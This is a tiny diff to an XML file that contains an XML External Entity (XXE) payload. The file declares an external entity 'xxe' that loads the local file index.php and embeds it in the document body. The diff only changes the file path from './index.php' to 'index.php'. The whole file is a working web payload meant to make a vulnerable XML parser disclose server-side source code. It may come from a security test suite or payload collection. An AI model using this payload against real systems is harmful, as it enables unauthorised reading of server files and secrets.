@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ 
     <!ELEMENT foo ANY >
-    <!ENTITY xxe SYSTEM "./index.php" >
+    <!ENTITY xxe SYSTEM "index.php" >
 ]>
 <foo>&xxe;</foo>
